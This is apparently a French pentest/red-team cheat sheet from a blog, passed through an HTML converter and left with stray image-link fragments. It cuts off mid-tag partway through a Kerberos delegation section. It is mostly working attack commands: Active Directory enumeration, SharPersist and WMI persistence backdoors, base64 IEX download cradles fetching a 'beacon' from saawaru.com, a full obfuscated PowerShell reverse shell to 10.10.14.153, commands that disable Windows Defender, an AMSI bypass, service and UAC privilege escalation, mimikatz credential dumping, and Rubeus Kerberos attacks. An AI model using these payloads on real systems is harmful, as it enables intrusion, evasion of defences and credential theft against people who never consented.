:</p><p>raphgui@vps ~&gt; nmap -p x,x,x,x -sCV <ip> -T5spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.034.png)</p><p>Vulnérabilité Scanner :</p><p>raphgui@vps ~&gt; nmap –script&#x3D;vuln <ip> -T5spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.035.png)</p><h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumération"></a>Web Enumération</h3><p>Utiliser <a href="https://github.com/maurosoria/dirsearch">dirsearch :</a></p><p>raphgui@vps ~&gt; python3 dirsearch.py -u <a href="https://saawaru.com/spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.036.png">https://saawaru.com/spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.036.png</a>)</p><p>Selectionner que les extensions désirés :</p><p>raphgui@vps ~&gt; python3 dirsearch.py -e php,html,js -u <a href="https://saawaru.com/spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.037.png">https://saawaru.com/spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.037.png</a>)</p><p>Utiliser sa propre wordlist</p><p>raphgui@vps ~&gt; python3 dirsearch.py -u <a href="https://saawaru.com/">https://saawaru.com/</a> -w &#x2F;path&#x2F;to&#x2F;wordlist![ref3]</p><h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>Afin d’obtenir divergues informations sur l’Active Directory nous pouvons utiliser le module <em>”powerview”</em> qui permet cela. On comme tout d’abord par un :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> PowerView.ps1<br></code></pre></td></tr></table></figure><p>Cela va permettre de charger le module en mémoire. Obtenir des informations concernants le domain :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-Domainspose</span>.Words.b8a8f815<span class="hljs-literal">-686d-4082-ae71-ce7001721a24</span>.<span class="hljs-number">040</span>.png)<br></code></pre></td></tr></table></figure><p>Obtenir des informations concernants le Domain Controller</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-DomainController</span> | <span class="hljs-built_in">select</span> Forest, Name, OSVersion | flspose.Words.b8a8f815<span class="hljs-literal">-686d-4082-ae71-ce7001721a24</span>.<span class="hljs-number">041</span>.png)<br></code></pre></td></tr></table></figure><p>Obtenir des informations sur un utilisateur :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> &lt;user&gt; <span class="hljs-literal">-Properties</span> DisplayName, MemberOf | <span class="hljs-built_in">fl</span><br></code></pre></td></tr></table></figure><p>Obtenir toutes les machines objets dans l’AD :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Properties</span> DnsHostName | <span class="hljs-built_in">sort</span> <span class="hljs-literal">-Property</span> DnsHostName<br></code></pre></td></tr></table></figure><p>Obtenir toutes les OU :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-DomainOU</span> <span class="hljs-literal">-Properties</span> Name | <span class="hljs-built_in">sort</span> <span class="hljs-literal">-Property</span> Name<br></code></pre></td></tr></table></figure><p>Obtenir les domaines avec des relations relations d’approbations :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Get-DomainTrust</span><br></code></pre></td></tr></table></figure><p>Obtenir tous les utilisateurs d’un groupe :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-NetGroupMember</span> <span class="hljs-literal">-GroupName</span> <span class="hljs-string">&quot;domain admins&quot;</span>spose.Words.b8a8f815<span class="hljs-literal">-686d-4082-ae71-ce7001721a24</span>.<span class="hljs-number">046</span>.png)<br></code></pre></td></tr></table></figure><h3 id="ADSearch"><a href="#ADSearch" class="headerlink" title="ADSearch"></a>ADSearch</h3><p>Trouver les délegations Unconstrained :</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ADSearch<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--search</span> &quot;(&amp;(objectCategory=computer)(userAccountControl:<span class="hljs-number">1.2</span>.<span class="hljs-number">840.113556</span>.<span class="hljs-number">1.4</span>.<span class="hljs-number">803</span>:=<span class="hljs-number">524288</span>))&quot; <span class="hljs-attr">--attributes</span> samaccountname,dn!<span class="hljs-selector-attr">[ref3]</span><br></code></pre></td></tr></table></figure><p>Trouver les délégations Constrained :</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ADSearch<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--search</span> &quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=\*))&quot; <span class="hljs-attr">--attributes</span> cn,dnshostname,samaccountname,msds-allow!<span class="hljs-selector-attr">[ref4]</span><br></code></pre></td></tr></table></figure><h3 id="Persistance"><a href="#Persistance" class="headerlink" title="Persistance"></a>Persistance</h3><p>L’outil le plus utiliser pour de la persistance est <a href="https://github.com/mandiant/SharPersist">SharPersist</a>. Il propose différentes techniques :</p><p>HKCU &#x2F; HKLM Registres automatiquement éxécuter</p><ul><li>Taches programmés<ul><li>Dossier de démarrage</li></ul></li></ul><h3 id="Startup"><a href="#Startup" class="headerlink" title="Startup"></a>Startup</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">execute-assembly <span class="hljs-name">C</span>:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c <span class="hljs-string">&quot;...&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Registry-AutoRun"><a href="#Registry-AutoRun" class="headerlink" title="Registry AutoRun"></a>Registry AutoRun</h3><p>On upload un binaire puis on le rename “Updater.exe”</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">execute<span class="hljs-literal">-assembly</span> C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe <span class="hljs-literal">-t</span> reg <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;C:\ProgramData\Updater.exe&quot;</span> <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;/q /n&quot;</span> <span class="hljs-literal">-k</span> <span class="hljs-string">&quot;...&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Tache-Programme"><a href="#Tache-Programme" class="headerlink" title="Tâche Programmé"></a>Tâche Programmé</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">execute-assembly <span class="hljs-name">C</span>:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c <span class="hljs-string">&quot;C:\Windows\System32\WindowsPowerShell\v1</span><br></code></pre></td></tr></table></figure><h3 id="Windows-Service"><a href="#Windows-Service" class="headerlink" title="Windows Service"></a>Windows Service</h3><p>On upload un binaire puis on le rename “legit-svc.exe”</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">execute-assembly <span class="hljs-name">C</span>:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c <span class="hljs-string">&quot;C:\Windows\legit-svc.exe&quot;</span> -n <span class="hljs-string">&quot;legit-svc&quot;</span><br></code></pre></td></tr></table></figure><h3 id="WMI-Event"><a href="#WMI-Event" class="headerlink" title="WMI Event"></a>WMI Event</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell<span class="hljs-literal">-import</span> C:\Tools\PowerLurk.ps1<br></code></pre></td></tr></table></figure><p>Crée des events</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-built_in">Register-MaliciousWmiEvent</span> <span class="hljs-literal">-EventName</span> WmiBackdoor <span class="hljs-literal">-PermanentCommand</span> <span class="hljs-string">&quot;C:\Windows\smb_64.exe&quot;</span> <span class="hljs-literal">-Trigger</span> ProcessStart <span class="hljs-literal">-ProcessN</span><br></code></pre></td></tr></table></figure><h2 id="Evasion"><a href="#Evasion" class="headerlink" title="Evasion"></a>Evasion</h2><p>Evasion de windows defender via IEX (Base64 Unicode). Windows :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;IEX ((new-object net.webclient).downloadstring(&quot;http://saawaru.com/beacon&quot;))&#x27;</span><br><br><span class="hljs-built_in">PS</span> C:\&gt;[<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))<br></code></pre></td></tr></table></figure><p>Linux :</p><p>raphgui@vps ~&gt; set str ‘IEX ((new-object net.webclient).downloadstring(“<a href="http://saawaru.com/beacon">http://saawaru.com/beacon</a>“))’ spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.054.png)raphgui@vps ~&gt; echo -en $str | iconv -t UTF-16LE | base64 -w 0</p><p>Reverse Shell en PowerShell bypass AV :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-variable">$spf54f2s5b</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.153&quot;</span>,<span class="hljs-string">&quot;443&quot;</span>)<br>    <span class="hljs-variable">$s2d5s76x3b</span> = <span class="hljs-variable">$spf54f2s5b</span>.GetStream()<br>    [<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;<br>    <span class="hljs-variable">$xw21vc65c</span> = <span class="hljs-variable">$eNv:CompUtErNamE</span><br>    <span class="hljs-variable">$xw21vc65c</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$xw21vc65c</span>)<br>    <span class="hljs-variable">$s2d5s76x3b</span>.Write(<span class="hljs-variable">$xw21vc65c</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$xw21vc65c</span>.Length)<br>    <span class="hljs-variable">$msd42w3q6</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-string">&#x27;PS &#x27;</span> + (<span class="hljs-built_in">Get-Location</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    <span class="hljs-variable">$s2d5s76x3b</span>.Write(<span class="hljs-variable">$msd42w3q6</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$msd42w3q6</span>.Length)<br>    <span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$s2d5s76x3b</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-variable">$EncodedText</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding<br>        <span class="hljs-variable">$spfd4f2s5b</span> = <span class="hljs-variable">$EncodedText</span>.GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>)<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-variable">$xw21vc65d</span> = (<span class="hljs-built_in">InVoke-EXPreSsIoN</span> <span class="hljs-literal">-Command</span> <span class="hljs-variable">$spfd4f2s5b</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> )<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br><br>        &#125;<br>        <span class="hljs-variable">$mxd42w3q6</span>  = <span class="hljs-variable">$xw21vc65d</span> + <span class="hljs-string">&#x27;[&#x27;</span>+ <span class="hljs-variable">$eNv:CompUtErNamE</span> +<span class="hljs-string">&#x27;] PS &#x27;</span> + (<span class="hljs-built_in">Get-Location</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span><br>        <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$error</span>[<span class="hljs-number">0</span>] | <span class="hljs-built_in">Out-String</span>)<br>        <span class="hljs-variable">$error</span>.clear()<br>        <span class="hljs-variable">$mxd42w3q6</span> = <span class="hljs-variable">$mxd42w3q6</span> + <span class="hljs-variable">$x</span><br>        <span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$mxd42w3q6</span>)<br>        <span class="hljs-variable">$s2d5s76x3b</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length)<br>        <span class="hljs-variable">$s2d5s76x3b</span>.Flush()<br>    &#125;<br>    <span class="hljs-variable">$spf54f2s5b</span>.Close()<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$listener</span>)<br>    &#123;<br>        <span class="hljs-variable">$listener</span>.Stop()<br>    &#125;<br>&#125;<br><span class="hljs-keyword">catch</span><br>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Désactiver Windows Defender :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span><br><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-MAPSReporting</span> Disable<br></code></pre></td></tr></table></figure><p>Encode :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$commands</span> = <span class="hljs-string">&#x27;IEX ((new-object net.webclient).downloadstring(&quot;http://wkstn:8080/b&quot;))&#x27;</span> spose.Words.b8a8f815<span class="hljs-literal">-686d-4082-ae71-ce7001721a24</span>.<span class="hljs-number">057</span>.png)<span class="hljs-variable">$bytes</span> = [<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$commands</span>) <br><br><span class="hljs-variable">$encodedString</span> = [<span class="hljs-type">Convert</span>]::ToBase64String(<span class="hljs-variable">$bytes</span>) <br><br>powershell.exe <span class="hljs-literal">-a</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-enc</span> <span class="hljs-variable">$encodedString</span><br></code></pre></td></tr></table></figure><p>Bypass AMSI :</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$a</span> = [<span class="hljs-type">Ref</span>].Assembly.GetTypes()   spose.Words.b8a8f815<span class="hljs-literal">-686d-4082-ae71-ce7001721a24</span>.<span class="hljs-number">058</span>.png)<br><br><span class="hljs-keyword">ForEach</span>(<span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$a</span>) &#123;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span>.Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;\*iUtils&quot;</span>) &#123;<span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span>&#125;&#125;   <span class="hljs-variable">$d</span> = <span class="hljs-variable">$c</span>.GetFields(<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>)   <br><br><span class="hljs-keyword">ForEach</span>(<span class="hljs-variable">$e</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$d</span>) &#123;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>.Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;\*Failed&quot;</span>) &#123;<span class="hljs-variable">$f</span> = <span class="hljs-variable">$e</span>&#125;&#125;   <span class="hljs-variable">$f</span>.SetValue(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure><h2 id="Privesc"><a href="#Privesc" class="headerlink" title="Privesc"></a>Privesc</h2><p>L’élévation de privilège est une étape très importante du pentest. Elle a pour but de nous donner un accès avec plus de privilège, et très généralement root.</p><h3 id="Type-de-demarrage"><a href="#Type-de-demarrage" class="headerlink" title="Type de démarrage :"></a>Type de démarrage :</h3><p>Automatique - Le service démarre immédiatement au démarrage<br>Automatique (démarrage différé) - Le service attend un court laps de temps après le démarrage avant de démarrer principalement une option héritée pour aider le bureau à se charger plus rapidement).</p><ul><li>Manuel - Le service ne démarre que lorsqu’il est spécifiquement demandé.<ul><li>Désactivé - Le service est désactivé et ne fonctionnera pas.</li></ul></li></ul><h3 id="Etat-du-service"><a href="#Etat-du-service" class="headerlink" title="État du service"></a>État du service</h3><p>En cours d’exécution - Le service est en cours d’exécution.</p><p>Arrêté - Le service n’est pas en cours d’exécution.</p><ul><li>StartPending - Le service a été invité à démarrer et exécute sa procédure de démarrage.<ul><li>StopPending - Le service a été invité à s’arrêter et exécute sa procédure d’arrêt.</li></ul></li></ul><h3 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a>Unquoted Service Paths</h3><p>Cette privesc consiste à chercher un service qui a un PATH sans quote :</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Users\Raphguispose.Words.b8a8f815-<span class="hljs-number">686</span>d-<span class="hljs-number">4082</span>-ae71-ce7001721a24.<span class="hljs-number">064</span>.png)<br></code></pre></td></tr></table></figure><p>Ainsi qu’un PATH avec un espace tels que :</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Lwo</span> Help Me<span class="hljs-string">\MonService.exe![ref5]</span><br></code></pre></td></tr></table></figure><p>Le deuxième PATH montré est un exemple concret. Lorsque que “MonService.exe” va être lancer. Windows va d’abord faire <em>”C:\MonService.exe”</em> puis <em>”C:\Program Files\MonService.exe”</em> et pour finir </p><p><em>”C:\Program Files\Lwo Help Me\MonService.exe”</em>. Si nous pouvons écrire dans un des deux premiers PATH alors notre service &#x2F; binaire sera exécuté à la place.</p><h3 id="Weak-Service-Permissions"><a href="#Weak-Service-Permissions" class="headerlink" title="Weak Service Permissions"></a>Weak Service Permissions</h3><p>Cette escalade de privilège est assez simple, il faut chercher un service qui nous laisse modifier son PATH :</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">execute-assembly <span class="hljs-name">C</span>:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices<br></code></pre></td></tr></table></figure><p>Une fois qu’on a trouvé notre service :</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell-<span class="hljs-keyword">import</span> C:\Tools\<span class="hljs-keyword">Get</span>-ServiceAcl.ps1 <br>powershell <span class="hljs-keyword">Get</span>-ServiceAcl -<span class="hljs-type">Name</span> VulnService2 | <span class="hljs-keyword">select</span> -expand <span class="hljs-keyword">Access</span><br></code></pre></td></tr></table></figure><p>Si il y’a  <em>ChangeConfi</em> g cela nous permet de changer le PATH du binaire éxécuter par le service :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe<br>run sc stop VulnService2 <br>run sc start VulnService2<br></code></pre></td></tr></table></figure><p>Nous sommes désormais NT\Authority System.</p><h3 id="Weak-Service-Binary-Permissions"><a href="#Weak-Service-Binary-Permissions" class="headerlink" title="Weak Service Binary Permissions"></a>Weak Service Binary Permissions</h3><p>Cette fois si la démarche est différente, il s’agit d’un service dont nous avons le droit de renommer.</p><p>Si on le renomme puis on upload notre binaire et le nommons comme le service alors notre binaire sera executé.</p><h3 id="UAC-BYPASS"><a href="#UAC-BYPASS" class="headerlink" title="UAC BYPASS"></a>UAC BYPASS</h3><p>Très simple :</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">elevate uac-schtasks tcp-<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure><h2 id="Credential"><a href="#Credential" class="headerlink" title="Credential"></a>Credential</h2><p>Lorsque nous avons des privilèges élevés, il est important de récupéré des credentials. Ça peut être des usernames&#x2F;password, hash NTLM et Ticket Kerberos.</p><p>Nous avons comme outils très utiles pour récuperé des credentials mimikatz. Il est par default déja dans Cobalt Strike lorsque vous avez une beacon.</p><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>Nous allons commencé par un flag essentielle :</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz.exe token::elevate<br></code></pre></td></tr></table></figure><p>L’option <em>”token elevate”</em> va faire que mimikatz va impersonate le token choisis (par default <em>NT-AUTHORITY\SYSTEM</em> ).</p><p>Nous avons un autre flag :</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">mimikatz.exe lsadump<span class="hljs-type">::sam</span><br>mimikatz.exe lsadump<span class="hljs-type">::dcsync</span>  /<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure><p>Le <em>lsadump</em> va permettre de faire un dump du process <em>”lsass.exe”</em>. </p><p>L’option “sam” va permettre de dump les hashs des comptes étant dans la base de données Security Account Manager. </p><p>Elle contient les comptes locaux sur Windows Serveurs.</p><p>L’option “dcsync” va permettre de faire un attaque DCsync qui va faire une synchroniser une entrée spécifique.</p><p>Pour avoir plus d’information il est possible de faire :</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz.exe sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>Cela va permettre d’obtenir toutes les possibilités d’authentification d’un compte.</p><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><h3 id="Pass-the-Key-OverPass-the-Hash"><a href="#Pass-the-Key-OverPass-the-Hash" class="headerlink" title="Pass the Key &#x2F; OverPass the Hash"></a>Pass the Key &#x2F; OverPass the Hash</h3><p>C’est technique consiste à demander un tgt (pour faire du pass the ticket) avec le Hash NT.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Rubeus.exe asktgt /domain:<span class="hljs-string">&#x27;Domain&#x27;</span> /user:<span class="hljs-string">&#x27;user&#x27;</span> /rc4:<span class="hljs-string">&#x27;NThash&#x27;</span> /ptt<br></code></pre></td></tr></table></figure><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Pour faire du kerberoasting  :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe kerberoast /simple /nowrap<br></code></pre></td></tr></table></figure><p>Récupérer un user particulier :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe kerberoast /user:<span class="hljs-string">&#x27;name&#x27;</span> /simple /nowrap<br></code></pre></td></tr></table></figure><h3 id="AS-REPROASTING"><a href="#AS-REPROASTING" class="headerlink" title="AS-REPROASTING"></a>AS-REPROASTING</h3><p>Pour faire de l’as-rep roasting :</p><p>Permet de voir tous les utilisateurs as-reproastable :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe asreproast /simple /nowrap<br></code></pre></td></tr></table></figure><p>Récupérer un user particulier :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe asreproast /user:<span class="hljs-string">&#x27;name&#x27;</span> /simple /nowrap<br></code></pre></td></tr></table></figure><h3 id="Unconstrained-Delagation"><a href="#Unconstrained-Delagation" class="headerlink" title="Unconstrained Delagation"></a>Unconstrained Delagation</h3><p>Ecouter pour voir le TGT :</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.</span>\Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:10![ref4]<br></code></pre></td></tr></table></figure><p>Désormais on peut demander un ticket de service :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe asktgs /ticket:&lt;ticket en <span class="hljs-built_in">base64</span>&gt; /service:cifs/<span class="hljs-string">&#x27;domain&#x27;</span> /ptt<br></code></pre></td></tr></table></figure><p>Si par contre il n’y a pas de TGT, nous pouvons provoquer une connection en coerçant avec PrinterBug. PrinterBUG PoC :</p><p>Regarder si il y’a sur le Domain Controller le fichier Spools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> \\dc\pipe\spoolss<br></code></pre></td></tr></table></figure><p>Ensuite utiliser le <a href="https://github.com/leechristensen/SpoolSample">PoC</a> de Tikfin : </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">.\SpoolSample.exe dc <span class="hljs-tag">&lt;<span class="hljs-name">SPN</span> <span class="hljs-attr">unconstrained</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Et faire en même temps un Rubeus :</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-keyword">.</span>\Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:10<br></code></pre></td></tr></table></figure><h3 id="Constrained-Delegation"><a href="#Constrained-Delegation" class="headerlink" title="Constrained Delegation"></a>Constrained Delegation</h3><p>On peut utiliser tgtdeleg qui récupérer via la délégation en tant que le l’user qui le lance :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\Rubeus.exe tgtdeleg /nowrap<br></code></pre></td></tr></table></figure><p>Désormais on prend le ticket et on impersonate le compte l’administrator :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.\Rubeus.exe s4u /ticket:&#x27;ticket&#x27; /impersonateuser:administrator /domain:&#x27;domain&#x27; /msdsspn:cifs/&#x27;domain&#x27; /dc:&#x27;dc.domain&#x27; /ptt<br></code></pre></td></tr></table></figure><h3 id="Resource-Based-Constrained-Delegation"><a href="#Resource-Based-Constrained-Delegation" class="headerlink" title="Resource Based Constrained Delegation"></a>Resource Based Constrained Delegation</h3><p>1 - Créer une machine fake :</p><figure class="highlight 